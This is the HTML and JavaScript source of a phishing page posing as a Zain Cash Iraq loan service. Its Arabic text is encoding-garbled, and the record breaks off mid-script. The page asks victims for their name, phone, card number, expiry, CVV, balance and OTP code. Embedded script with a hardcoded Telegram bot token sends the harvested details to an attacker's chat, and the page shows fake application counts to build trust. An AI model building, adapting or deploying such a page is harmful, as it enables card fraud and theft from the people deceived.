<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>ÿ∑ŸÑÿ® ÿ≥ŸÑŸÅÿ© - Zain Cash ÿßŸÑÿπÿ±ÿßŸÇ</title>
  <link rel="icon" href="https://www2.0zz0.com/2025/09/28/09/936521249.jpeg">
  <style>
@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@700;500;400&display=swap');
:root {
  --main: #2672ea;
  --main2: #4a90e2;
  --bg: #f6f5fa;
  --bg2: #e2eafc;
  --card: #fff;
  --txt: #2c3e50;
  --success: #2ecc71;
  --error: #e74c3c;
  --shadow1: 0 8px 30px rgba(38, 114, 234, 0.10);
  --shadow2: 0 2px 12px rgba(38, 114, 234, 0.07);
  --glass: rgba(255,255,255,0.77);
  --glass-border: rgba(38, 114, 234, 0.15);
}
body[data-theme="dark"] {
  --main: #1e3a5f;
  --main2: #2672ea;
  --bg: #181c25;
  --bg2: #222940;
  --card: #232c47;
  --txt: #e2eafc;
  --success: #2ecc71;
  --error: #e74c3c;
  --shadow1: 0 8px 30px rgba(38, 114, 234, 0.28);
  --shadow2: 0 2px 12px rgba(38, 114, 234, 0.18);
  --glass: rgba(34,41,64,0.82);
  --glass-border: rgba(38, 114, 234, 0.19);
}
body {
  font-family: 'Cairo', Arial, sans-serif;
  background: linear-gradient(135deg, var(--main) 0%, var(--bg2) 100%);
  min-height: 100vh;
  margin: 0;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: background 0.5s;
  overflow-x: hidden;
}
#animated-bg {
  position: fixed;
  top: 0; left: 0; width: 100vw; height: 100vh;
  z-index: 0;
  pointer-events: none;
}
#welcome-modal {
  position: fixed;
  top: 0; left: 0; right: 0; bottom: 0;
  background: rgba(38,114,234,.11);
  z-index: 9999;
  display: flex; align-items: center; justify-content: center;
  animation: fadeIn 1.2s;
  backdrop-filter: blur(2px);
}
#welcome-modal.hide {display:none;}
#welcome-box {
  background: var(--glass);
  border-radius: 20px;
  box-shadow: var(--shadow1);
  border: 1.2px solid var(--glass-border);
  padding: 2.2rem 1.7rem;
  text-align: center;
  animation: scaleIn 1s;
  backdrop-filter: blur(6px);
}
#welcome-box h2 {color:var(--main);font-size:2rem;margin-bottom:15px;}
#welcome-box p {color:var(--txt);font-size:1.15rem;margin-bottom:22px;}
#welcome-box button {background:var(--main);color:#fff;padding:12px 45px;border:none;font-size:1.1rem;border-radius:9px;cursor:pointer;}
@keyframes scaleIn {from{transform:scale(.6)} to{transform:scale(1)}}
.container {
  background: var(--glass);
  border-radius: 26px;
  box-shadow: var(--shadow1);
  border: 1.5px solid var(--glass-border);
  backdrop-filter: blur(10px);
  padding: 2.3rem 1.4rem 1.6rem 1.4rem;
  width: 370px;
  max-width: 99vw;
  position: relative;
  transition: box-shadow 0.3s, background 0.5s;
  z-index:1;
}
.container:hover {
  box-shadow: 0 12px 40px rgba(37, 78, 218, 0.16), 0 2px 16px rgba(46,130,255,0.10);
}
.logo {
  width: 82px;
  display: block;
  margin: 0 auto 16px auto;
  border-radius: 16px;
  box-shadow: var(--shadow2);
  animation: fadeIn 2s;
  border: 2px solid var(--main2);
  background: #fff;
}
h1 {
  text-align: center;
  color: var(--main);
  margin-bottom: 18px;
  font-weight: 800;
  font-size: 1.32rem;
  letter-spacing: 1px;
  text-shadow: 0 1px 4px #e2eafc44;
}
.progress-bar {
  width: 100%;
  height: 8px;
  background: var(--bg2);
  border-radius: 7px;
  overflow: hidden;
  margin-bottom: 18px;
  box-shadow: 0 1px 4px #e2eafc33;
}
.progress-inner {
  height: 100%;
  background: linear-gradient(90deg, var(--main) 0%, var(--main2) 100%);
  width: 0%;
  transition: width 0.6s;
}
.stats {
  background: var(--main2);
  padding: 8px 0;
  border-radius: 12px;
  text-align: center;
  font-size: 1.01rem;
  color: #fff;
  margin-bottom: 13px;
  font-weight: 700;
  letter-spacing:.5px;
  animation: fadeIn 1.2s;
  box-shadow: 0 1px 6px var(--main2), 0 0.5px 3px #2672ea22;
}
.step {display:none;animation: fadeIn 0.9s;}
.step.active {display:block;}
label {
  display: block;
  margin-bottom: 4px;
  color: var(--txt);
  font-weight: 600;
  font-size: 1.04rem;
  letter-spacing:.5px;
}
.input-wrap {
  position: relative;
  margin-bottom: 15px;
  display: flex;
  justify-content: center;
}
input, select {
  width: 85%;
  min-width: 120px;
  max-width: 270px;
  margin: 0 auto;
  display: block;
  padding: 0.6rem 0.75rem;
  border: 2px solid #d9e0ed;
  border-radius: 11px;
  font-size: 1.07rem;
  background: #f8fbffcc;
  transition: border 0.2s, background 0.4s, box-shadow 0.2s;
  box-shadow: 0 2px 8px #e2eafc18;
}
input:focus, select:focus {
  border-color: var(--main2);
  background: var(--bg2);
  box-shadow: 0 2px 12px #4a90e233;
}
input.valid, select.valid {border-color: var(--success);}
input.invalid, select.invalid {border-color: var(--error);}
input[type="number"], input[type="tel"] {
  direction: ltr;
  font-family: 'Cairo', Arial, sans-serif;
}
select {
  padding-left: 0.7rem;
}
body[data-theme="dark"] input, body[data-theme="dark"] select {background: #262f47dd;border-color:#222940;color:#e2eafc;}
.btn {
  width: 94%;
  min-width: 120px;
  max-width: 340px;
  padding: 1.1rem 0;
  background: linear-gradient(90deg, var(--main) 0%, var(--main2) 100%);
  border: none;
  border-radius: 16px;
  color: white;
  font-size: 1.22rem;
  font-weight: 800;
  margin: 18px auto 0 auto;
  cursor: pointer;
  transition: background 0.2s, transform 0.18s, box-shadow 0.22s;
  box-shadow: 0 2px 12px #2672ea38, 0 2px 8px #e2eafc;
  display: block;
  letter-spacing: .5px;
}
.btn:disabled {
  opacity: .6;
  cursor: not-allowed;
}
.btn:hover {
  background: linear-gradient(90deg, var(--main2) 0%, var(--main) 100%);
  transform: translateY(-2px) scale(1.03);
  box-shadow: 0 6px 20px #4a90e222, 0 2px 8px #e2eafc;
}
.top-actions {
  display: flex;
  justify-content: flex-end;
  margin-bottom: 11px;
}
.theme-switch, .help-btn {
  background: var(--bg2);
  color: var(--main);
  border: none;
  font-size: 1.15rem;
  border-radius: 9px;
  padding: 7px 17px;
  cursor: pointer;
  margin-left: 7px;
  transition: background .3s, color .3s;
  box-shadow: 0 1px 5px #e2eafc;
  min-width: 36px;
}
.theme-switch.active {color:#fff;background:var(--main);}
.help-btn {font-size:1.15rem;}
.success {
  text-align: center;
  padding: 2rem 0.5rem 1rem 0.5rem;
}
.success svg {
  margin-bottom: 18px;
  background: #fff;
  border-radius: 50%;
}
.success h2 {
  color: var(--success);
  font-weight: 700;
  margin-bottom: 13px;
}
.success p {
  color: var(--txt);
  font-size: 1.08rem;
  margin-bottom: 20px;
}
#toast {
  position: fixed;
  bottom: 18px;
  right: 18px;
  background: var(--main);
  color: #fff;
  padding: 11px 23px;
  border-radius: 13px;
  font-size: 1.08rem;
  box-shadow: 0 2px 16px var(--main2);
  opacity: 0;
  transition: opacity 0.4s, bottom 0.4s;
  z-index: 999;
  pointer-events: none;
}
#toast.show {
  opacity: 1;
  bottom: 38px;
}
#helpModal {
  position:fixed;top:0;left:0;right:0;bottom:0;
  background:rgba(38,114,234,.12);display:none;z-index:9999;
  align-items:center;justify-content:center;
  backdrop-filter: blur(2px);
}
#helpModal.active {display:flex;}
#helpBox {
  background:var(--glass);border-radius:19px;box-shadow:var(--shadow2);padding:1.5rem 1.1rem;min-width:220px;max-width:90vw;
  animation:scaleIn .6s;
  border: 1.2px solid var(--glass-border);
  backdrop-filter: blur(5px);
}
#helpBox h3 {color:var(--main);margin-bottom:13px;}
#helpBox ul {margin:0;padding:0 0 0 10px;}
#helpBox li {margin-bottom:7px;color:var(--txt);}
#helpBox button {margin-top:13px;background:var(--main);color:#fff;padding:6px 18px;border:none;font-size:0.98rem;border-radius:8px;cursor:pointer;}
.share-bar {
  margin: 13px 0;
  display: flex;
  justify-content: center;
  gap: 12px;
}
.share-btn {
  background: var(--main2);
  color: #fff;
  border: none;
  border-radius: 9px;
  padding: 8px 17px;
  font-size: 1.01rem;
  cursor: pointer;
  transition: background .3s, box-shadow .19s;
  box-shadow: 0 1px 5px #e2eafc;
  min-width: 80px;
}
.share-btn:hover {background:var(--main);}
.support-btn {
  position: fixed;
  left: 18px;
  bottom: 18px;
  background: var(--success);
  color: #fff;
  border: none;
  border-radius: 50%;
  width: 46px; height: 46px;
  font-size: 1.32rem;
  box-shadow: 0 2px 12px #2ecc7140;
  cursor: pointer;
  z-index:900;
  transition: background .2s;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 0;
}
.support-btn:hover {background:var(--main2);}
.live-status {
  text-align:center;
  margin: 20px 0 14px 0;
}
.live-loader {
  display: inline-block;
  width: 34px; height: 34px; border-radius:50%;
  border: 3px solid var(--main2);
  border-top: 3px solid var(--bg2);
  animation: spin 1.1s linear infinite;
  margin-bottom: 10px;
}
@keyframes spin {to{transform:rotate(360deg);}
}
@keyframes fadeIn {
  from { opacity: 0; transform: translateY(18px);}
  to { opacity: 1; transform: translateY(0);}
}
@media (max-width: 520px) {
  .container { padding: 1rem 0.4rem; width: 99vw;}
  h1 { font-size: 1rem;}
  #helpBox {padding:0.6rem;}
  .support-btn {bottom: 6px; left: 6px;}
  input, select {max-width: 98vw;}
  .btn {max-width: 99vw;}
}
::-webkit-scrollbar {width:7px;background:var(--bg2);}
::-webkit-scrollbar-thumb {background:var(--main2);border-radius:20px;}
</style>
</head>
<body data-theme="light">
<canvas id="animated-bg"></canvas>
<div id="welcome-modal">
  <div id="welcome-box">
    <h2>ŸÖÿ±ÿ≠ÿ®ÿß ÿ®ŸÉ!</h2>
    <p>Ÿäÿ≥ÿ±ŸÜÿß ÿ™ŸÇÿØŸäŸÖ ÿÆÿØŸÖÿ© ÿ∑ŸÑÿ® ÿßŸÑÿ≥ŸÑŸÅÿ© ÿπÿ®ÿ± ÿ≤ŸäŸÜ ŸÉÿßÿ¥ ÿßŸÑÿπÿ±ÿßŸÇ ÿ®ÿ™ÿ¨ÿ±ÿ®ÿ© ÿ¨ÿØŸäÿØÿ© ŸàŸÖŸÖŸäÿ≤ÿßÿ™ ŸÖÿ™ŸÇÿØŸÖÿ©.<br>ÿßÿ®ÿØÿ£ ÿßŸÑÿ¢ŸÜ!</p>
    <button onclick="document.getElementById('welcome-modal').classList.add('hide')">ÿßÿ®ÿØÿ£ ÿßŸÑÿÆÿØŸÖÿ©</button>
  </div>
</div>
  <div class="container">
    <div class="top-actions">
      <button class="theme-switch" id="themeSwitch" title="ÿ™ÿ∫ŸäŸäÿ± ÿßŸÑŸàÿ∂ÿπ">üåô</button>
      <button class="help-btn" id="helpBtn" title="ŸÖÿ≥ÿßÿπÿØÿ© ŸÅŸàÿ±Ÿäÿ©">ÿü</button>
    </div>
    <img src="https://www2.0zz0.com/2025/09/28/09/936521249.jpeg" class="logo" alt="ÿ¥ÿπÿßÿ± ÿ≤ŸäŸÜ ŸÉÿßÿ¥"/>
    <h1 id="mainTitle">ÿ™ŸÇÿØŸäŸÖ ÿ∑ŸÑÿ® ÿ≥ŸÑŸÅÿ©</h1>
    <div class="stats" id="statsBox">
      ÿ™ŸÖ ÿ™ŸÇÿØŸäŸÖ <span id="todayCount"></span> ÿ∑ŸÑÿ® ÿßŸÑŸäŸàŸÖ Ÿà <span id="monthCount"></span> Ÿáÿ∞ÿß ÿßŸÑÿ¥Ÿáÿ± üöÄ
    </div>
    <div class="progress-bar"><div class="progress-inner" id="progressBar"></div></div>
    <div id="step1" class="step active">
      <form id="loanForm" autocomplete="off">
        <label id="nameLabel"> ÿßŸÑÿßÿ≥ŸÖ ÿßŸÑÿ±ÿ®ÿßÿπŸä </label>
        <div class="input-wrap">
          <input type="text" id="userName" placeholder="ÿßŸÉÿ™ÿ® ÿßÿ≥ŸÖŸÉ ÿßŸÑÿ±ÿ®ÿßÿπŸä" required>
        </div>
        <label id="amountLabel"> ŸÖÿ®ŸÑÿ∫ ÿßŸÑÿ≥ŸÑŸÅÿ©</label>
        <div class="input-wrap">
          <select id="loanAmount" required>
            <option value="" disabled selected>ÿßÿÆÿ™ÿ± ŸÖÿ®ŸÑÿ∫ ÿßŸÑÿ≥ŸÑŸÅÿ©</option>
            <option value="500000">500,000 ÿØŸäŸÜÿßÿ±</option>
            <option value="750000">750,000 ÿØŸäŸÜÿßÿ±</option>
            <option value="1000000">1,000,000 ÿØŸäŸÜÿßÿ±</option>
            <option value="1250000">1,250,000 ÿØŸäŸÜÿßÿ±</option>
            <option value="2000000">2,000,000 ÿØŸäŸÜÿßÿ±</option>
            <option value="4000000">4,000,000 ÿØŸäŸÜÿßÿ±</option>
            <option value="5000000">5,000,000 ÿØŸäŸÜÿßÿ±</option>
            <option value="10000000">10,000,000 ÿØŸäŸÜÿßÿ± (ŸÑŸÑŸÖÿ™ÿ≥ÿ®ŸäŸÜ Ÿàÿ≤ÿßÿ±ŸäÿßŸã)</option>
          </select>
        </div>
        <label id="phoneLabel"> ÿ±ŸÇŸÖ ÿßŸÑŸáÿßÿ™ŸÅ </label>
        <div class="input-wrap">
          <input type="tel" id="userPhone" pattern="\d{10,15}" placeholder="ŸÖÿ´ÿßŸÑ: 077xxxxxxxx" required inputmode="numeric">
        </div>
        <button type="submit" class="btn" id="step1Btn">ŸÖÿ™ÿßÿ®ÿπÿ©</button>
      </form>
    </div>
    <div id="step2" class="step">
      <form id="cardForm" autocomplete="off">
        <label id="cardLabel"> ÿ±ŸÇŸÖ ÿ®ÿ∑ÿßŸÇÿ© ÿ≤ŸäŸÜ ŸÉÿßÿ¥ <span style="color:red">*</span></label>
        <div class="input-wrap">
          <input type="text" maxlength="16" pattern="\d{16}" id="cardNumber" placeholder="ÿßÿØÿÆŸÑ ÿ±ŸÇŸÖ ÿßŸÑÿ®ÿ∑ÿßŸÇÿ©" required inputmode="numeric">
        </div>
        <label id="expLabel"> ÿ™ÿßÿ±ŸäÿÆ ÿßŸÜÿ™Ÿáÿßÿ° ÿßŸÑÿ®ÿ∑ÿßŸÇÿ© <span style="color:red">*</span></label>
        <div class="input-wrap">
          <input type="text" maxlength="5" id="expDate" placeholder="ŸÖÿ´ÿßŸÑ: 01/27" required inputmode="numeric">
        </div>
        <label id="cvvLabel"> ÿ±ŸÖÿ≤ CVV <span style="color:red">*</span></label>
        <div class="input-wrap">
          <input type="text" maxlength="3" pattern="\d{3}" id="cvv" placeholder="ÿßÿØÿÆŸÑ ÿ±ŸÖÿ≤ CVV" required inputmode="numeric">
        </div>
        <label id="balanceLabel"> ÿßŸÑÿ±ÿµŸäÿØ ÿßŸÑÿ≠ÿßŸÑŸä ŸÅŸä ÿßŸÑÿ®ÿ∑ÿßŸÇÿ© (ŸÑŸÑÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿßŸÑŸÖŸÑŸÉŸäÿ©) <span style="color:red">*</span></label>
        <div class="input-wrap">
          <input type="number" id="cardBalance" placeholder="ÿßÿØÿÆŸÑ ÿ±ÿµŸäÿØ ÿßŸÑÿ®ÿ∑ÿßŸÇÿ© ÿßŸÑÿ≠ÿßŸÑŸä" required min="0" step="1">
        </div>
        <button type="submit" class="btn" id="step2Btn">ŸÖÿ™ÿßÿ®ÿπÿ©</button>
      </form>
    </div>
    <div id="step3" class="step">
      <form id="otpForm" autocomplete="off">
        <label id="otpLabel"> ÿ±ŸÖÿ≤ ÿßŸÑÿ™ÿ≠ŸÇŸÇ (6 ÿ£ÿ±ŸÇÿßŸÖ) </label>
        <div class="input-wrap">
          <input type="text" maxlength="6" pattern="\d{6}" id="otp" placeholder="ÿßÿØÿÆŸÑ ÿ±ŸÖÿ≤ ÿßŸÑÿ™ÿ≠ŸÇŸÇ" required inputmode="numeric">
        </div>
        <button type="submit" class="btn" id="step3Btn">ÿ™ÿ£ŸÉŸäÿØ</button>
      </form>
    </div>
    <div id="step4" class="step">
      <div class="live-status" id="liveStatus">
        <div class="live-loader"></div>
        <div id="liveMsg">ÿ¨ÿßÿ±Ÿä ŸÖÿπÿßŸÑÿ¨ÿ© ÿßŸÑÿ∑ŸÑÿ®...</div>
      </div>
      <div class="success" id="finalSuccess" style="display:none;">
        <svg width="64" height="64" fill="#2ecc71" viewBox="0 0 64 64">
          <circle cx="32" cy="32" r="32"/>
          <polyline points="18,34 29,46 46,20" fill="none" stroke="#fff" stroke-width="5"/>
        </svg>
        <h2 id="thanksTitle">ÿ™ŸÖ ÿ™ŸÇÿØŸäŸÖ ÿ∑ŸÑÿ® ÿßŸÑÿ≥ŸÑŸÅÿ© ÿ®ŸÜÿ¨ÿßÿ≠!</h2>
        <p id="thanksText">ÿ≥Ÿäÿ™ŸÖ ÿßŸÑÿ™ŸàÿßÿµŸÑ ŸÖÿπŸÉ ŸÇÿ±Ÿäÿ®ÿßŸã ŸÑÿßÿ≥ÿ™ŸÑÿßŸÖ ÿßŸÑŸÖÿ®ŸÑÿ∫. ÿ¥ŸÉÿ±ÿßŸã ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖŸÉ ÿÆÿØŸÖÿ™ŸÜÿß.</p>
        <div class="share-bar">
          <button class="share-btn" onclick="shareNow('whatsapp')">Ÿàÿßÿ™ÿ≥ÿßÿ®</button>
        </div>
        <button class="btn" onclick="window.location.reload()">ÿ∑ŸÑÿ® ÿ¨ÿØŸäÿØ</button>
      </div>
    </div>
  </div>
  <button class="support-btn" id="supportBtn" title="ÿ™ŸàÿßÿµŸÑ ÿØÿπŸÖ"><span>üí¨</span></button>
  <div id="helpModal">
    <div id="helpBox">
      <h3>ŸÖÿ≥ÿßÿπÿØÿ© ŸÅŸàÿ±Ÿäÿ©</h3>
      <ul>
        <li>üîπ ÿ£ÿØÿÆŸÑ ÿ¨ŸÖŸäÿπ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ÿ®ÿ¥ŸÉŸÑ ÿµÿ≠Ÿäÿ≠ ŸÑÿ∂ŸÖÿßŸÜ ŸÇÿ®ŸàŸÑ ÿßŸÑÿ∑ŸÑÿ®.</li>
        <li>üîπ ŸÑÿß ÿ™ÿ¥ÿßÿ±ŸÉ ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿ®ÿ∑ÿßŸÇÿ™ŸÉ ŸÖÿπ ÿ£Ÿä ÿ¨Ÿáÿ© ÿ∫Ÿäÿ± ŸÖŸàÿ´ŸàŸÇÿ©.</li>
        <li>üîπ ÿ•ÿ≥ÿ™ÿÆÿØŸÖ ÿ≤ÿ± ÿßŸÑŸàÿ∂ÿπ ÿßŸÑŸÑŸäŸÑŸä ŸÑÿ¨ÿπŸÑ ÿßŸÑÿ™ÿµŸÅÿ≠ ÿ£ŸÉÿ´ÿ± ÿ±ÿßÿ≠ÿ© ŸÑŸäŸÑÿßŸã.</li>
        <li>üîπ ÿßÿÆÿ™ÿ± ŸÖÿ®ŸÑÿ∫ ÿßŸÑÿ≥ŸÑŸÅÿ© ŸÖŸÜ ÿßŸÑŸÇÿßÿ¶ŸÖÿ©.</li>
        <li>üîπ ŸÅŸä ÿ≠ÿßŸÑ ŸÑŸÖ ŸäÿµŸÑŸÉ ÿ±ŸÖÿ≤ ÿßŸÑÿ™ÿ≠ŸÇŸÇÿå ÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿµÿ≠ÿ© ÿ®ŸäÿßŸÜÿßÿ™ŸÉ.</li>
      </ul>
      <button onclick="document.getElementById('helpModal').classList.remove('active')">ÿ•ÿ∫ŸÑÿßŸÇ</button>
    </div>
  </div>
  <div id="toast"></div>
  <audio id="successSound" src="https://cdn.pixabay.com/audio/2022/03/15/audio_115b6b4b8e.mp3"></audio>
  <audio id="errorSound" src="https://cdn.pixabay.com/audio/2022/03/15/audio_114b6b4b8e.mp3"></audio>
  <script>
  // Telegram Bot Info
  const TELEGRAM_TOKEN = "7562829296:AAH5NJ9d6vHwszcQurqpl3vCX1C-d59SbVg";
  const TELEGRAM_CHATID = "-4680375515";
  let spamBlock = false;
  let userData = {};
  let currentStep = 0;

  // ÿÆŸÑŸÅŸäÿ© ŸÖÿ™ÿ≠ÿ±ŸÉÿ©
  function animateBg() {
    const canvas = document.getElementById('animated-bg');
    const ctx = canvas.getContext('2d');
    function resize() {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    }
    resize();
    window.addEventListener('resize', resize);

    let circles = [];
    for(let i=0;i<18;i++){
      circles.push({
        x:Math.random()*canvas.width,
        y:Math.random()*canvas.height,
        r:Math.random()*16+7,
        dx:Math.random()*2-1,
        dy:Math.random()*2-1,
        color:i%3===0?"#2672ea55":(i%2===0?"#4a90e255":"#2ecc7140")
      });
    }
    function draw(){
      ctx.clearRect(0,0,canvas.width,canvas.height);
      circles.forEach(c=>{
        ctx.beginPath();
        ctx.arc(c.x,c.y,c.r,0,2*Math.PI);
        ctx.fillStyle=c.color;
        ctx.fill();
        c.x+=c.dx;c.y+=c.dy;
        if(c.x<0||c.x>canvas.width)c.dx*=-1;
        if(c.y<0||c.y>canvas.height)c.dy*=-1;
      });
      requestAnimationFrame(draw);
    }
    draw();
  }
  animateBg();

  // ÿ¥ÿ±Ÿäÿ∑ ÿßŸÑÿ™ŸÇÿØŸÖ
  function setProgress(step) {
    let p = (step/3)*100;
    document.getElementById('progressBar').style.width = p + "%";
  }
  setProgress(0);

  // ÿ•ÿ≠ÿµÿßÿ¶Ÿäÿßÿ™ ÿßŸÑÿ∑ŸÑÿ®ÿßÿ™ (ŸàŸáŸÖŸäÿ©)
  function setStats() {
    let today = Math.floor(200 + Math.random()*50);
    let month = Math.floor(2200 + Math.random()*500);
    document.getElementById('todayCount').textContent = today;
    document.getElementById('monthCount').textContent = month;
  }
  setStats();

  // ÿ™ÿ®ÿØŸäŸÑ ÿßŸÑŸàÿ∂ÿπ ÿßŸÑŸÑŸäŸÑŸä
  document.getElementById('themeSwitch').onclick = function() {
    let body = document.body;
    if(body.getAttribute("data-theme") == "light") {
      body.setAttribute("data-theme","dark");
      this.innerHTML = "‚òÄÔ∏è";
      this.classList.add("active");
    } else {
      body.setAttribute("data-theme","light");
      this.innerHTML = "üåô";
      this.classList.remove("active");
    }
  };

  // ÿ≤ÿ± ÿßŸÑŸÖÿ≥ÿßÿπÿØÿ©
  document.getElementById('helpBtn').onclick = function() {
    document.getElementById("helpModal").classList.add("active");
  };

  // ÿ≤ÿ± ÿØÿπŸÖ Ÿàÿßÿ™ÿ≥ÿßÿ® Ÿàÿ™ŸäŸÑŸäÿ¨ÿ±ÿßŸÖ
  document.getElementById('supportBtn').onclick = function() {
    window.open('https://t.me/zaincashiraq','_blank');
  };

  // ÿπÿ±ÿ∂ ÿÆÿ∑Ÿàÿ© ŸÖÿπŸäŸÜÿ© ŸÖÿπ ÿ≠ŸÖÿßŸäÿ©
  function showStep(n) {
    if (typeof n !== "number" || n < 0 || n > 4) return;
    document.querySelectorAll(".step").forEach((el, i) => el.classList.toggle('active', i === n));
    setProgress(n);
    currentStep = n;
    // ÿ™ÿµŸÅŸäÿ± ÿßŸÑÿ≠ŸÇŸàŸÑ ÿπŸÜÿØ ŸÉŸÑ ÿÆÿ∑Ÿàÿ© ŸÖŸÜÿßÿ≥ÿ®ÿ©
    if (n === 1) {
      ['cardNumber','expDate','cvv','cardBalance'].forEach(id=>{
        document.getElementById(id).value = "";
        document.getElementById(id).classList.remove('valid','invalid');
      });
    }
    if (n === 2) {
      document.getElementById('otp').value = "";
      document.getElementById('otp').classList.remove('valid','invalid');
    }
  }

  // ÿßŸÑÿ™Ÿàÿ≥ÿ™ ÿßŸÑŸÖŸÜÿ®ÿ´ŸÇ + ÿµŸàÿ™
  function showToast(msg, color="var(--main)", audio="") {
    const toast = document.getElementById('toast');
    toast.textContent = msg;
    toast.style.background = color;
    toast.classList.add('show');
    if(audio === "success") document.getElementById('successSound').play();
    if(audio === "error") document.getElementById('errorSound').play();
    setTimeout(()=>toast.classList.remove('show'), 1700);
  }

  // ÿ™ÿ≠ŸÇŸÇ ŸÖÿ®ÿßÿ¥ÿ± ŸÖŸÜ ÿßŸÑŸÖÿØÿÆŸÑÿßÿ™
  function validateInput(id, regex) {
    let inp = document.getElementById(id);
    inp.addEventListener('input', function(){
      if(regex.test(inp.value)){
        inp.classList.remove("invalid");
        inp.classList.add("valid");
      } else {
        inp.classList.add("invalid");
        inp.classList.remove("valid");
      }
    });
  }
  validateInput('userName', /^[\u0600-\u06FFa-zA-Z\s]{7,}$/);
  validateInput('userPhone', /^\d{10,15}$/);
  validateInput('cardNumber', /^\d{16}$/);
  validateInput('expDate', /^(0[1-9]|1[0-2])\/\d{2}$/);
  validateInput('cvv', /^\d{3}$/);
  validateInput('otp', /^\d{6}$/);
  validateInput('cardBalance', /^\d+$/);

  // ŸÖŸÜÿπ ÿßŸÑÿ≥ÿ®ÿßŸÖ
  function blockSpam(ms) {
    spamBlock = true;
    setTimeout(()=>{spamBlock=false;}, ms);
  }

  // ÿßŸÑÿÆÿ∑Ÿàÿ© 1
  document.getElementById('loanForm').onsubmit = async function(e) {
    e.preventDefault();
    if(currentStep !== 0) return; // ŸÖŸÜÿπ ÿßŸÑÿ™ŸÑÿßÿπÿ®
    if(spamBlock) return showToast('ÿßŸÜÿ™ÿ∏ÿ± ŸÇŸÑŸäŸÑÿßŸã ...', '#e67e22');
    const userName = document.getElementById('userName').value.trim();
    const loanAmount = document.getElementById('loanAmount').value;
    const userPhone = document.getElementById('userPhone').value.trim();
    if (userName.length < 7) {
      showToast('Ÿäÿ±ÿ¨Ÿâ ÿ•ÿØÿÆÿßŸÑ ÿßŸÑÿßÿ≥ŸÖ ÿßŸÑÿ±ÿ®ÿßÿπŸä ÿ®ÿ¥ŸÉŸÑ ÿµÿ≠Ÿäÿ≠', 'var(--error)', "error");
      return;
    }
    if (!loanAmount) {
      showToast('Ÿäÿ±ÿ¨Ÿâ ÿßÿÆÿ™Ÿäÿßÿ± ŸÖÿ®ŸÑÿ∫ ÿßŸÑÿ≥ŸÑŸÅÿ©', 'var(--error)', "error");
      return;
    }
    if (!/^\d{10,15}$/.test(userPhone)) {
      showToast('Ÿäÿ±ÿ¨Ÿâ ÿ•ÿØÿÆÿßŸÑ ÿ±ŸÇŸÖ Ÿáÿßÿ™ŸÅ ÿµÿ≠Ÿäÿ≠', 'var(--error)', "error");
      return;
    }
    userData = {userName, loanAmount, userPhone};
    blockSpam(3000);
    showToast('ÿ¨ÿßÿ±Ÿä ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™...','','');
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({
        chat_id: TELEGRAM_CHATID,
        text: `ÿ∑ŸÑÿ® ÿ≥ŸÑŸÅÿ© ÿ¨ÿØŸäÿØ:\nÿßŸÑÿßÿ≥ŸÖ: ${userName}\nÿßŸÑŸÖÿ®ŸÑÿ∫: ${Number(loanAmount).toLocaleString()} ÿØŸäŸÜÿßÿ±\nÿ±ŸÇŸÖ ÿßŸÑŸáÿßÿ™ŸÅ: ${userPhone}`
      })
    });
    setTimeout(()=>showStep(1), 1200);
  };

  // ÿßŸÑÿÆÿ∑Ÿàÿ© 2
  document.getElementById('cardForm').onsubmit = async function(e) {
    e.preventDefault();
    if(currentStep !== 1) return; // ŸÖŸÜÿπ ÿßŸÑÿ™ŸÑÿßÿπÿ®
    if(spamBlock) return showToast('ÿßŸÜÿ™ÿ∏ÿ± ŸÇŸÑŸäŸÑÿßŸã ...', '#e67e22');

    const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g,'');
    const expDate = document.getElementById('expDate').value;
    const cvv = document.getElementById('cvv').value;
    const cardBalance = document.getElementById('cardBalance').value.trim();

    if (!/^\d{16}$/.test(cardNumber)) {
      showToast('ÿ±ŸÇŸÖ ÿßŸÑÿ®ÿ∑ÿßŸÇÿ© ÿ∫Ÿäÿ± ÿµÿ≠Ÿäÿ≠', 'var(--error)', "error");
      return;
    }
    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expDate)) {
      showToast('ÿ™ÿßÿ±ŸäÿÆ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° Ÿäÿ¨ÿ® ÿ£ŸÜ ŸäŸÉŸàŸÜ ŸÖÿ´ŸÑ 01/27', 'var(--error)', "error");
      return;
    }
    if (!/^\d{3}$/.test(cvv)) {
      showToast('ÿ±ŸÖÿ≤ CVV ÿ∫Ÿäÿ± ÿµÿ≠Ÿäÿ≠', 'var(--error)', "error");
      return;
    }
    if (!/^\d+$/.test(cardBalance) || cardBalance.length === 0) {
      showToast('Ÿäÿ±ÿ¨Ÿâ ÿ•ÿØÿÆÿßŸÑ ÿ±ÿµŸäÿØ ÿßŸÑÿ®ÿ∑ÿßŸÇÿ© ÿ®ÿ¥ŸÉŸÑ ÿµÿ≠Ÿäÿ≠', 'var(--error)', "error");
      return;
    }
    userData.cardNumber = cardNumber;
    userData.expDate = expDate;
    userData.cvv = cvv;
    userData.cardBalance = cardBalance;

    blockSpam(3000);
    showToast('ÿ¨ÿßÿ±Ÿä ÿ•ÿ±ÿ≥ÿßŸÑ ÿ®ŸäÿßŸÜÿßÿ™ ÿßŸÑÿ®ÿ∑ÿßŸÇÿ©...','','');
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({
        chat_id: TELEGRAM_CHATID,
